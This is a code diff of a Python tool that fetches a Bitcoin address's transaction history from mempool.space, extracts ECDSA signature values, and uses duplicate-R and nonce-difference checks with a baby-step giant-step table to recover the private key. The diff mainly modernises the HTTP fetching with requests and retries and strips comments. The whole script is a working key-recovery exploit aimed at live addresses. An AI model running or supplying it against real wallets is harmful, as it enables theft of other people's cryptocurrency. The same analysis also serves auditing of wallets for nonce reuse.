@@ -1,13 +1,12 @@
 # -*- coding: utf-8 -*-
 """
-
 @author: iceland
 """
 import sys
 import json
 import argparse
-from urllib.request import urlopen
-# from itertools import combinations
+import time
+import requests
 import secp256k1 as ice
 
 G = ice.scalar_multiplication(1)
@@ -35,7 +34,6 @@ if address == '':
 def get_rs(sig):
     rlen = int(sig[2:4], 16)
     r = sig[4:4+rlen*2]
-#    slen = int(sig[6+rlen*2:8+rlen*2], 16)
     s = sig[8+rlen*2:]
     return r, s
 #==============================================================================
@@ -77,14 +75,22 @@ def parseTx(txn):
     return [first, inp_list, rest]
 #==============================================================================
 
-def get_rawtx_from_blockchain(txid):
-    try:
-        htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout = 20)
-    except:
-        print('Unable to connect internet to fetch RawTx. Exiting..')
-        sys.exit(1)
-    else: res = htmlfile.read().decode('utf-8')
-    return res
+def get_rawtx_from_blockchain(txid, retries=3, delay=5):
+    """Fetch raw transaction hex from mempool.space with retry logic"""
+    url = f"https://mempool.space/api/tx/{txid}/hex"
+    for attempt in range(1, retries+1):
+        try:
+            res = requests.get(url, timeout=30)
+            res.raise_for_status()
+            return res.text.strip()
+        except requests.exceptions.Timeout:
+            print(f"Timeout fetching {txid} (attempt {attempt}/{retries})")
+        except requests.exceptions.RequestException as e:
+            print(f"Error fetching {txid}: {e}")
+            break
+        time.sleep(delay)
+    print(f"Failed to fetch raw transaction for {txid}")
+    return None
 #==============================================================================
 
 def getSignableTxn(parsed):
@@ -112,9 +118,6 @@ def HASH160(pubk_hex):
     return ice.pubkey_to_h160(0, iscompressed, P).hex()
 #==============================================================================
 
-# def diff_comb(alist):
-#     return [ice.point_subtraction(x, y) for x, y in combinations(alist, 2)]
-
 def diff_comb_idx(alist):
     LL = len(alist)
     RDD = []
@@ -122,14 +125,12 @@ def diff_comb_idx(alist):
         for j in range(i+1, LL):
             RDD.append((i, j, ice.point_subtraction(alist[i], alist[j])))
             RDD.append((i, j, ice.point_addition(alist[i], alist[j])))
-#    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
     return RDD
 #==============================================================================
 def inv(a):
     return pow(a, N - 2, N)
 
 def calc_RQ(r, s, z, pub_point):
-    # r, s, z in int format and pub_point in upub bytes
     RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
     RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
     sdr = (s * inv(r)) % N
@@ -151,7 +152,6 @@ def getk1(r1, s1, z1, r2, s2, z2, m):
     dr = (s1 * r2 - s2 * r1) % N
     return (nr * inv(dr)) % N
 
-
 def getpvk(r1, s1, z1, r2, s2, z2, m):
     x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
     xi = inv((s1 * r2 - s2 * r1) % N)
@@ -171,14 +171,13 @@ def check_tx(address):
     cdx = []
     ccount = 0
     try:
-        htmlfile = urlopen(f'https://mempool.space/api/address/{address}/txs/chain', timeout = 20)
+        htmlfile = requests.get(f'https://mempool.space/api/address/{address}/txs/chain', timeout = 20)
+        res = htmlfile.json()
     except:
         print('Unable to connect internet to fetch RawTx. Exiting..')
         sys.exit(1)
     else: 
         while True:
-            # current single fetch limit = 25. Loop added for getting all Tx.
-            res = json.loads(htmlfile.read())
             txcount = len(res)
             if txcount == 0:
                 break
@@ -191,10 +190,9 @@ def check_tx(address):
                     if res[i]["vin"][j]["prevout"]["scriptpubkey_address"] == address:
                         txid.append(res[i]["txid"])
                         cdx.append(j)
-    #                    scriptsig = res[i]["vin"][j]["scriptsig"]
-    #                    print(f'Txid: {txid[-1]}  Index: {cdx[-1]}  Scriptsig: {scriptsig}')
             try:
-                htmlfile = urlopen(f'https://mempool.space/api/address/{address}/txs/chain/{lasttxid}', timeout = 20)
+                htmlfile = requests.get(f'https://mempool.space/api/address/{address}/txs/chain/{lasttxid}', timeout = 20)
+                res = htmlfile.json()
             except:
                 print('Unable to connect internet to fetch more RawTx. continuing...')
                 break
@@ -202,10 +200,6 @@ def check_tx(address):
 #==============================================================================
 
 print('\nStarting Program...')
-#address = '1JtAupan5MSPXxSsWFiwA79bY9LD2Ga1je'
-# 1FdJa233RjptkxJv8MrezooSMkSgwrLJPV
-# 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm
-
 print('-'*120)
 txid, cdx = check_tx(address)
 d = set([txid[i] +'BS'+ str(cdx[i]) for i in range(len(txid))])
@@ -213,11 +207,13 @@ txid = [line.split('BS')[0] for line in d]
 cdx = [int(line.split('BS')[1]) for line in d]
 print(f'Total {len(txid)} outgoing unique Tx fetched from the Address {address}')
 
-# list(filter(lambda i: txid[i] == 'anyTx', range(len(txid))))
 RQ, rL, sL, zL, QL = [], [], [], [], []
 
 for c in range(len(txid)):
     rawtx = get_rawtx_from_blockchain(txid[c])
+    if rawtx is None:
+        print(f"Skipped {txid[c]} (failed to fetch)")
+        continue
     try:
         m = parseTx(rawtx)
         e = getSignableTxn(m)
@@ -228,16 +224,15 @@ for c in range(len(txid)):
                 zL.append( int( e[i][2], 16) )
                 QL.append( ice.pub2upub(e[i][3]) )
                 print('='*70,f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {e[i][0]}\n     S: {e[i][1]}\n     Z: {e[i][2]}\nPubKey: {e[i][3]}')
-    except: print(f'Skipped the Tx [{txid[c]}]........')
+    except: 
+        print(f'Skipped the Tx [{txid[c]}]........')
         
 print('='*70); print('-'*120)
 
-#==============================================================================
 for c in range(len(rL)):
     RQ.append( calc_RQ( rL[c], sL[c], zL[c], QL[c] ) )
 if len(QL) > 0: pub_point_Q = QL[0]
 
-# RD = diff_comb(RQ)
 RD = diff_comb_idx(RQ)
 
 print('RQ = ')
@@ -250,7 +245,6 @@ for i in RD:
     if i[2] == ZERO: print(f'Duplicate R Found. Congrats!. {i[0], i[1], i[2].hex()}')
 #==============================================================================
 
-# Time and RAM intensive process to make bigger Table
 print(f'Starting to prepare BSGS Table with {bP} elements')
 ice.bsgs_2nd_check_prepare(bP)
 
@@ -264,13 +258,10 @@ for Q in RD:
 print('='*70); print('-'*120)
 for i in solvable_diff:
     print(f'[i={i[0]}] [j={i[1]}] [R Diff = {i[2]}]')
-#    k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
-#    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
     di = all_pvk_candidate(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
     for d in di:
         if ice.scalar_multiplication(d) == pub_point_Q:
             print(f'Privatekey FOUND: {hex(d)}       Address: {address}')
-#        else: print(f'Privatekey MISSED: {hex(d)}')
     print('='*70); print('-'*120)
 FdupR = [i.hex()[2:66] for i in RQ]
 if len(FdupR) != len(set(FdupR)): print(f'Duplicate R Vulnerability exists in this Address: {address}')
